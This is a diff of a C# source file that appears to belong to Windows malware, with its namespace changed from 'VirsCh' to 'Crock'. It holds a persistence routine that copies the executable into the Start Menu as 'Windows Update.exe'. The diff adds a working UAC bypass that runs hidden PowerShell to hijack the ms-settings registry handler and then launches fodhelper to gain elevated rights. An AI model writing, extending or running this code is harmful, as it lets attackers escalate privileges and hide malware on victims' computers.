@@ -1,12 +1,10 @@
-﻿using Microsoft.VisualBasic;
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
-using System.Windows.Forms;
 
-namespace VirsCh
+namespace Crock
 {
     class Addition
     {
@@ -60,6 +58,29 @@ namespace VirsCh
         public static void InstallAR()
         {
             File.Copy(Misc.MyLoacation(), $"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
+        }
+
+        // UAC bypass
+        public static void UAC()
+        {
+            ProcessStartInfo uac = new ProcessStartInfo();
+            uac.FileName = @"powershell.exe";
+            uac.WindowStyle = ProcessWindowStyle.Hidden;
+            uac.Arguments = "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value ";
+            uac.Arguments += System.Reflection.Assembly.GetEntryAssembly().Location; ;
+            uac.Arguments += " -Force";
+            Process.Start(uac);
+
+            Thread.Sleep(2000);
+
+            uac.Arguments = "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force";
+            Process.Start(uac);
+
+            Thread.Sleep(2000);
+
+            uac.FileName = @"cmd.exe";
+            uac.Arguments = "fodhelper";
+            Process.Start(uac);
         }
     }
 }
